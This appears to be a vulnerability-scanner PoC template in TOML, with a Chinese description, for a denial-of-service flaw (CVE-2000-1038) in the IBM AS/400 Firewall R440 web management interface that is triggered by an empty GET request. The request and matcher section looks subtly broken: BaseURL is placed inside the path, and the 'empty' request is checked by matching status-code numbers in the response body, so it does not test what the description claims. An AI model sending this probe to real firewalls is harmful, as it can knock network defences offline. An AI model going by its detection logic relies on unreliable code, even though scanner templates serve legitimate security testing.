[info]
author = "AVE"
description = "IBM AS/400 Firewall R440 Web管理接口存在拒绝服务漏洞。远程攻击者无需身份认证即可通过向目标设备的Web管理端口发送一个空的GET请求，导致防火墙服务崩溃或停止响应，造成拒绝服务。通过发送空GET请求并检测服务响应来验证漏洞存在。"
id = "POC-AVE-2000-1058"
name = "IBM AS/400 Firewall 空GET请求拒绝服务 PoC"
severity = "medium"
tags = ["ave-2000-1058"]
vuln_id = [
    "CVE-2000-1038",
    "AVE-2000-1058",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "401",
    "403",
    "500",
]
